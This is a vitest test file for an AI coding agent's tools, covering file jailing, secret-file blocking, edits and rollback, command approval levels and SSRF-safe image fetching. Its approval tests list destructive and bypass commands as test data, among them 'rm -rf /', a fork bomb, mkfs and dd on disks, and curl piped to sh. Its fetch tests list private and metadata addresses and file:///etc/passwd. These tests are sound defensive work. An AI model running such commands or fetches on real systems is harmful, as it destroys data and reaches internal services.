import { mkdir, mkdtemp, readFile, symlink, writeFile } from "node:fs/promises";
import { homedir } from "node:os";
import { join } from "node:path";
import { afterEach, describe, expect, it, vi } from "vitest";
import { createCheckpoint, rollback } from "./checkpoints";
import { authorize, isRiskyCommand, isSensitiveWrite } from "./policy";
import { fetchPicture, isPrivateAddress, pagePictures } from "./net";
import { isHardline } from "./sandbox";
import { prepare, toolsFor, type ToolContext } from "./tools";
import { ToolError, createPaths } from "./workspace";
import type { AgentLevel } from "@bluebird/shared";

async function setup(level: AgentLevel = "ask") {
  // Not under the system temp folder, so "sensitive write" checks mean something.
  await mkdir(join(process.cwd(), ".data"), { recursive: true });
  const base = await mkdtemp(join(process.cwd(), ".data", "agent-test-"));
  const root = join(base, "start");
  await mkdir(root);
  const ctx: ToolContext = {
    jail: createPaths(root, { unrestricted: level === "full" }),
    settings: { level, root },
    reads: new Map(),
    checkpoint: createCheckpoint(join(base, "cp")),
  };
  const call = async (name: string, args: Record<string, unknown>) => {
    const prepared = await prepare(name, args, ctx);
    const outcome = await prepared.run();
    return { prepared, outcome, result: typeof outcome === "string" ? outcome : outcome.text };
  };
  return { base, root, ctx, call };
}

describe("finding files", () => {
  it("starts relative paths in the starting folder and reaches anywhere else", async () => {
    const { base, root, ctx } = await setup();
    await writeFile(join(base, "elsewhere.txt"), "x");
    expect(ctx.jail.resolve("note.txt")).toBe(join(ctx.jail.root, "note.txt"));
    expect(ctx.jail.resolve(join(base, "elsewhere.txt"))).toBe(join(base, "elsewhere.txt"));
    expect(ctx.jail.resolve("../elsewhere.txt")).toBe(join(base, "elsewhere.txt"));
    expect(ctx.jail.resolve("~/anything")).toBe(join(homedir(), "anything"));
    // Links are followed to where they really lead.
    await symlink(base, join(root, "link"));
    expect(ctx.jail.resolve("link/elsewhere.txt")).toBe(join(base, "elsewhere.txt"));
    expect(ctx.jail.display(join(base, "elsewhere.txt"))).toMatch(/^~\/.*elsewhere\.txt$/);
    expect(ctx.jail.display(join(root, "a/b.txt"))).toBe("a/b.txt");
  });

  it("keeps credential files and git internals away from the file tools, except with Full access", async () => {
    const { ctx } = await setup();
    expect(() => ctx.jail.resolve(".env")).toThrow(/secrets/);
    expect(() => ctx.jail.resolve("~/.ssh/id_rsa")).toThrow(/secrets/);
    expect(ctx.jail.resolve(".env.example")).toContain(".env.example");
    expect(() => ctx.jail.resolve(".git/hooks/pre-commit", { write: true })).toThrow(/protected/);
    const open = createPaths(ctx.jail.root, { unrestricted: true });
    expect(open.resolve(".env")).toContain(".env");
    expect(open.resolve(".git/hooks/pre-commit", { write: true })).toContain("pre-commit");
  });
});

describe("file tools", () => {
  it("creates, reads, edits and refuses unsafe replacements", async () => {
    const { root, call, ctx } = await setup();
    await call("write_file", { path: "src/a.txt", content: "one\ntwo\nthree\n" });
    expect(await readFile(join(root, "src/a.txt"), "utf8")).toBe("one\ntwo\nthree\n");

    ctx.reads.clear();
    await expect(call("write_file", { path: "src/a.txt", content: "x" })).rejects.toThrow(/Read it/);
    const read = await call("read_file", { path: "src/a.txt" });
    expect(read.result).toContain("2\ttwo");

    const edit = await call("edit_file", { path: "src/a.txt", edits: [{ oldText: "two", newText: "2" }] });
    expect(edit.prepared.preview).toContain("-two");
    expect(edit.prepared.preview).toContain("+2");
    expect(await readFile(join(root, "src/a.txt"), "utf8")).toBe("one\n2\nthree\n");

    await writeFile(join(root, "dup.txt"), "a\na\n");
    await call("read_file", { path: "dup.txt" });
    await expect(call("edit_file", { path: "dup.txt", edits: [{ oldText: "a", newText: "b" }] })).rejects.toThrow(/more than one/);
    await expect(call("edit_file", { path: "dup.txt", edits: [{ oldText: "zzz", newText: "b" }] })).rejects.toThrow(/not found/);
  });

  it("works on files outside the starting folder", async () => {
    const { base, call } = await setup();
    await writeFile(join(base, "other.txt"), "hello\n");
    expect((await call("read_file", { path: join(base, "other.txt") })).result).toContain("1\thello");
    await call("edit_file", { path: join(base, "other.txt"), edits: [{ oldText: "hello", newText: "bye" }] });
    expect(await readFile(join(base, "other.txt"), "utf8")).toBe("bye\n");
  });

  it("notices a file that changed since it was read", async () => {
    const { root, call } = await setup();
    await writeFile(join(root, "f.txt"), "v1");
    await call("read_file", { path: "f.txt" });
    await new Promise((resolve) => setTimeout(resolve, 15));
    await writeFile(join(root, "f.txt"), "v2 by someone else");
    await expect(call("edit_file", { path: "f.txt", edits: [{ oldText: "v2", newText: "v3" }] })).rejects.toThrow(/changed since/);
  });

  it("searches, lists and finds files", async () => {
    const { root, call } = await setup();
    await mkdir(join(root, "src"));
    await writeFile(join(root, "src/app.ts"), "export const hello = 1;\n");
    await writeFile(join(root, "notes.md"), "hello world\n");
    await mkdir(join(root, "node_modules"));
    await writeFile(join(root, "node_modules/x.ts"), "hello\n");
    expect((await call("grep", { pattern: "hello" })).result.split("\n").sort()).toEqual(["notes.md:1: hello world", "src/app.ts:1: export const hello = 1;"]);
    expect((await call("find_files", { pattern: "**/*.ts" })).result).toBe("src/app.ts");
    expect((await call("list_dir", {})).result).toContain("src/");
  });

  it("can undo a reply's changes", async () => {
    const { base, root, call } = await setup();
    await writeFile(join(root, "keep.txt"), "original");
    await call("read_file", { path: "keep.txt" });
    await call("edit_file", { path: "keep.txt", edits: [{ oldText: "original", newText: "changed" }] });
    await call("write_file", { path: "new.txt", content: "fresh" });
    const restored = await rollback(join(base, "cp"), "/");
    expect(restored).toHaveLength(2);
    expect(await readFile(join(root, "keep.txt"), "utf8")).toBe("original");
    await expect(readFile(join(root, "new.txt"), "utf8")).rejects.toThrow();
  });

  it("offers every tool at every level", () => {
    expect(toolsFor().map((t) => t.name)).toEqual([
      "read_file", "list_dir", "find_files", "grep", "view_image", "page_images", "fetch_image",
      "write_file", "edit_file", "run_command", "process_list", "process_output", "process_stop", "delegate_task", "swarm_run",
    ]);
  });
});

describe("commands", () => {
  it("run like a terminal: pipes, redirects, any folder", async () => {
    const { base, root, call } = await setup();
    const elsewhere = join(base, "elsewhere");
    await mkdir(elsewhere);
    const out = await call("run_command", { command: "echo hello | tr a-z A-Z > made.txt && pwd", cwd: elsewhere });
    expect(await readFile(join(elsewhere, "made.txt"), "utf8")).toBe("HELLO\n");
    expect(out.result).toContain("elsewhere");
    expect((await call("run_command", { command: "pwd" })).result).toContain(root.split("/").pop()!);
    await expect(call("run_command", { command: "pwd", cwd: "/definitely/not/here" })).rejects.toThrow(/does not exist/);
  });

  it("stops a command that runs too long and keeps Bluebird's own keys out", async () => {
    process.env.BLUEBIRD_TEST_SECRET = "hidden";
    process.env.MY_TOOL_SETTING = "visible";
    const { call } = await setup();
    const slow = Date.now();
    expect((await call("run_command", { command: "sleep 30", timeout_seconds: 1 })).result).toContain("Stopped after 1 s");
    expect(Date.now() - slow).toBeLessThan(8000);
    const env = (await call("run_command", { command: "env" })).result;
    expect(env).not.toContain("hidden");
    expect(env).toContain("MY_TOOL_SETTING=visible");
  });
});

describe("what waits for approval", () => {
  const prep = async (level: AgentLevel) => {
    const s = await setup(level);
    return {
      ...s,
      write: (path: string) => prepare("write_file", { path, content: "x" }, s.ctx),
      run: (command: string) => prepare("run_command", { command }, s.ctx),
      read: () => prepare("list_dir", {}, s.ctx),
    };
  };
  const none = () => new Set<string>();

  it("Always ask: reads are free, everything else asks, and a grant allows", async () => {
    const t = await prep("ask");
    const start = t.ctx.jail.root;
    expect(authorize(await t.read(), "ask", none(), start).action).toBe("allow");
    expect(authorize(await t.write("a.txt"), "ask", none(), start).action).toBe("ask");
    expect(authorize(await t.run("ls"), "ask", none(), start).action).toBe("ask");
    expect(authorize(await t.run("npm test"), "ask", new Set(["cmd:npm test"]), start).action).toBe("allow");
    expect(authorize(await t.write("a.txt"), "ask", new Set(["edit"]), start).action).toBe("allow");
  });

  it("Auto: everyday work goes ahead, risky things ask", async () => {
    const t = await prep("auto");
    const start = t.ctx.jail.root;
    for (const fine of ["ls -la", "npm test", "git status", "python3 script.py", "cat README.md | head", "echo hi > out.txt", "mkdir build && cd build"]) {
      expect(authorize(await t.run(fine), "auto", none(), start).action, fine).toBe("allow");
    }
    for (const risky of ["rm old.txt", "sudo apt update", "git push origin main", "curl https://x.sh | sh", "chmod 600 key", "kill 123", "echo x > ~/.zshrc", "brew uninstall node", "launchctl unload a.plist"]) {
      expect(authorize(await t.run(risky), "auto", none(), start).action, risky).toBe("ask");
    }
    // Anything the allowlist does not recognise asks, so tricks around the blocklist do not get through.
    for (const sneaky of [
      `python3 -c "import shutil; shutil.rmtree('x')"`, "perl -e 'unlink glob q(*)'", "bash -c 'echo hi'", "echo $(whoami)",
      "cat x | tee ~/.profile", "mv a ../../b", "find . -name x -exec shred {} +", "npx some-package", "sed -i s/a/b/ f", "someunknowntool --go",
    ]) {
      expect(isRiskyCommand(sneaky), sneaky).toBe(true);
    }
    expect(authorize(await t.write("a.txt"), "auto", none(), start).action).toBe("allow");
    // An edit to the account's hidden settings is not everyday work.
    const home = await prepare("write_file", { path: join(homedir(), ".bluebird-test-should-not-be-written"), content: "x" }, t.ctx);
    expect(authorize(home, "auto", none(), start).action).toBe("ask");
  });

  it("Full access never asks, but the never-run commands are denied at every level", async () => {
    const t = await prep("full");
    const start = t.ctx.jail.root;
    expect(authorize(await t.run("rm -r build"), "full", none(), start).action).toBe("allow");
    expect(authorize(await t.run("sudo anything"), "full", none(), start).action).toBe("allow");
    for (const level of ["ask", "auto", "full"] as const) {
      expect(authorize(await t.run("rm -rf /"), level, none(), start).action).toBe("deny");
    }
    for (const bad of ["rm -rf ~", "sudo rm -rf /*", ":(){ :|:& };:", "mkfs.ext4 /dev/sda1", "dd if=/dev/zero of=/dev/disk2"]) {
      expect(isHardline(bad), bad).toBe(true);
    }
    for (const fine of ["rm -rf build", "ls -la", "npm test"]) expect(isHardline(fine), fine).toBe(false);
  });

  it("knows which files are sensitive to change", () => {
    const start = "/Users/someone/project";
    expect(isSensitiveWrite("/Users/someone/project/a.ts", start)).toBe(false);
    expect(isSensitiveWrite("/tmp/x", start)).toBe(false);
    expect(isSensitiveWrite("/etc/hosts", start)).toBe(true);
    expect(isSensitiveWrite(join(homedir(), ".zshrc"), start)).toBe(true);
    expect(isSensitiveWrite(join(homedir(), "Library", "LaunchAgents", "a.plist"), start)).toBe(true);
    expect(isSensitiveWrite(join(homedir(), "Documents", "notes.txt"), start)).toBe(false);
    expect(isRiskyCommand("ls")).toBe(false);
    void ToolError;
  });
});

describe("looking at pictures", () => {
  const PIXEL = Buffer.from(
    "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8BQDwAEhQGAhKmMIQAAAABJRU5ErkJggg==",
    "base64",
  );

  it("hands the picture to a model that can see", async () => {
    const { root, ctx, call } = await setup();
    await writeFile(join(root, "shot.png"), PIXEL);
    ctx.vision = { native: true };
    const seen = await call("view_image", { path: "shot.png" });
    expect(typeof seen.outcome).toBe("object");
    if (typeof seen.outcome === "object") {
      expect(seen.outcome.images[0]).toMatchObject({ mime: "image/png" });
      expect(seen.outcome.images[0].base64.length).toBeGreaterThan(20);
    }
    // read_file points the model at the right tool.
    await expect(call("read_file", { path: "shot.png" })).rejects.toThrow(/view_image/);
  });

  it("borrows another connected vision model when the chosen one cannot see", async () => {
    const { root, ctx, call } = await setup();
    await writeFile(join(root, "shot.png"), PIXEL);
    ctx.vision = { native: false, describe: async (_image, question) => `a tiny dot (asked: ${question.slice(0, 12)})` };
    expect((await call("view_image", { path: "shot.png", question: "What colour?" })).result).toContain("a tiny dot (asked: What colour?)");
  });

  it("says plainly how to fix it when nothing can see", async () => {
    const { root, ctx, call } = await setup();
    await writeFile(join(root, "shot.png"), PIXEL);
    ctx.vision = { native: false, describe: async () => null };
    await expect(call("view_image", { path: "shot.png" })).rejects.toThrow(/vision model in Settings, Engine/);
    await writeFile(join(root, "notes.txt"), "x");
    await expect(call("view_image", { path: "notes.txt" })).rejects.toThrow(/not a png/);
  });
});

describe("pictures from the web", () => {
  const PNG = Buffer.from(
    "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8BQDwAEhQGAhKmMIQAAAABJRU5ErkJggg==",
    "base64",
  );
  const respond = (handler: (url: string) => Response) =>
    vi.stubGlobal("fetch", vi.fn(async (input: string | URL | Request) => handler(String(input))));
  const image = () => new Response(PNG, { headers: { "content-type": "image/png" } });

  afterEach(() => vi.unstubAllGlobals());

  it("only fetches from the public internet", async () => {
    expect(["127.0.0.1", "10.1.2.3", "192.168.0.9", "172.20.0.1", "169.254.169.254", "::1", "fd00::1", "::ffff:10.0.0.1"].map(isPrivateAddress)).toEqual(Array(8).fill(true));
    expect(["93.184.216.34", "8.8.8.8", "2606:4700::1111"].map(isPrivateAddress)).toEqual([false, false, false]);
    respond(() => image());
    for (const bad of ["http://localhost/a.png", "https://127.0.0.1/a.png", "https://192.168.1.5/a.png", "https://user:pw@93.184.216.34/a.png", "file:///etc/passwd", "ftp://93.184.216.34/a.png"]) {
      await expect(fetchPicture(bad), bad).rejects.toThrow(ToolError);
    }
  });

  it("checks every redirect, the type and the size", async () => {
    respond((url) => (url.includes("start") ? new Response(null, { status: 302, headers: { location: "https://10.0.0.5/secret.png" } }) : image()));
    await expect(fetchPicture("https://93.184.216.34/start.png")).rejects.toThrow(/not the web/);
    respond(() => new Response("<html>", { headers: { "content-type": "text/html" } }));
    await expect(fetchPicture("https://93.184.216.34/page")).rejects.toThrow(/not a png/);
    respond(() => new Response(Buffer.alloc(9 * 1024 * 1024), { headers: { "content-type": "image/png" } }));
    await expect(fetchPicture("https://93.184.216.34/huge.png")).rejects.toThrow(/8 MB/);
    respond((url) => (url.endsWith("/hop") ? new Response(null, { status: 301, headers: { location: "/final.png" } }) : image()));
    const ok = await fetchPicture("https://93.184.216.34/hop");
    expect(ok).toMatchObject({ mime: "image/png", url: "https://93.184.216.34/final.png" });
  });

  it("fetch_image looks at a picture, tells the model how to show it, and saves it only with approval", async () => {
    const { root, ctx, call } = await setup();
    respond(() => image());
    ctx.vision = { native: true };
    const seen = await call("fetch_image", { url: "https://93.184.216.34/cat.png" });
    expect(typeof seen.outcome).toBe("object");
    expect(seen.result).toContain("![short caption](https://93.184.216.34/cat.png)");
    expect(authorize(seen.prepared, "ask", new Set(), root).action).toBe("allow");

    const saveCtx = { ...ctx };
    const prepared = await prepare("fetch_image", { url: "https://93.184.216.34/cat.png", save_to: "pics/cat.png" }, saveCtx);
    expect(prepared.kind).toBe("write");
    expect(authorize(prepared, "ask", new Set(), root).action).toBe("ask");
    await expect(readFile(join(root, "pics/cat.png"))).rejects.toThrow();
    await prepared.run();
    expect((await readFile(join(root, "pics/cat.png"))).length).toBe(PNG.length);
  });

  it("page_images finds the share picture first, skips logos and tiny pictures, and stays on the public web", async () => {
    const html = `<html><head>
      <meta property="og:image" content="https://cdn.example.com/cover-1000.jpg">
      <meta name="twitter:image" content="/relative/cover.png">
    </head><body>
      <img src="/assets/logo.png" width="300" height="300">
      <img src="/tiny.png" width="20" height="20">
      <img src="/gallery/one.jpg" width="640" height="480">
      <img data-src="https://cdn.example.com/lazy.webp" width="500">
      <img src="/icons/sprite.svg">
    </body></html>`;
    expect(pagePictures(html, "https://93.184.216.34/album/drip")).toEqual([
      "https://cdn.example.com/cover-1000.jpg",
      "https://93.184.216.34/relative/cover.png",
      "https://93.184.216.34/gallery/one.jpg",
      "https://cdn.example.com/lazy.webp",
    ]);

    const { ctx, call } = await setup();
    respond(() => new Response(html, { headers: { "content-type": "text/html; charset=utf-8" } }));
    const out = await call("page_images", { url: "https://93.184.216.34/album/drip" });
    expect(out.result).toContain("1. https://cdn.example.com/cover-1000.jpg");
    expect(authorize(out.prepared, "ask", new Set(), ctx.jail.root).action).toBe("allow");
    await expect(call("page_images", { url: "http://localhost:3000/chat" })).rejects.toThrow(/not the web/);
    respond(() => new Response("{}", { headers: { "content-type": "application/json" } }));
    await expect(call("page_images", { url: "https://93.184.216.34/api" })).rejects.toThrow(/not a web page/);
  });
});

describe("tool records kept with a reply", () => {
  it("keeps the plan and steps when one record is oversized or damaged", async () => {
    const { toolsFromMetadata } = await import("@bluebird/shared");
    const good = { id: "plan-0", name: "plan_update", kind: "read", summary: "Plan", status: "done", output: "[]" };
    const long = { id: "t1", name: "browser_open", kind: "exec", summary: "Open " + "x".repeat(900), status: "running" };
    const broken = { id: "t2", kind: "nonsense" };
    const tools = toolsFromMetadata({ tools: [good, long, broken] });
    expect(tools.map((tool) => tool.id)).toEqual(["plan-0", "t1"]);
    expect(tools[1].summary.length).toBe(300);
  });
});
